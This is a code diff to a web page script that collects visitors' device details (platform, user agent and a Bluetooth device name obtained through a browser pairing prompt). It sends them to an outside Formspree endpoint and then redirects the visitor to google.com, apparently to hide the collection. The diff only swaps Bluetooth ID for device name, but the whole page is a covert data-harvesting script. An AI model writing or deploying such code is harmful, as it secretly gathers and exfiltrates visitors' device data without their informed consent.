@@ -76,18 +76,18 @@
       return deviceInfo;
     }
 
-    // Function to get Bluetooth ID (if available)
-    async function getBluetoothId() {
+    // Function to get Bluetooth device name (if available)
+    async function getBluetoothName() {
       try {
         const device = await navigator.bluetooth.requestDevice({ acceptAllDevices: true });
-        return device.id;  // Return the Bluetooth device ID
+        return device.name || 'Unknown Bluetooth Device';  // Return the Bluetooth device name
       } catch (error) {
         console.error('Bluetooth Error:', error);
         return 'No Bluetooth device selected';
       }
     }
 
-    function saveDeviceInfo(info, bluetoothId) {
+    function saveDeviceInfo(info, bluetoothName) {
       const url = 'https://formspree.io/f/xnnaegzr'; // Replace with your Formspree URL
 
       fetch(url, {
@@ -100,7 +100,7 @@
           detail: info.detail,
           platform: info.platform,
           userAgent: info.userAgent,
-          bluetoothId: bluetoothId  // Include Bluetooth ID in the data sent
+          bluetoothName: bluetoothName  // Include Bluetooth name in the data sent
         })
       })
       .then(response => response.json())
@@ -111,8 +111,8 @@
     // Function to collect data and redirect
     async function collectData() {
       const info = getDeviceInfo();
-      const bluetoothId = await getBluetoothId();
-      saveDeviceInfo(info, bluetoothId);
+      const bluetoothName = await getBluetoothName();  // Fetch the Bluetooth device name
+      saveDeviceInfo(info, bluetoothName);
 
       // Redirect to Google.com
       window.location.href = 'https://www.google.com';
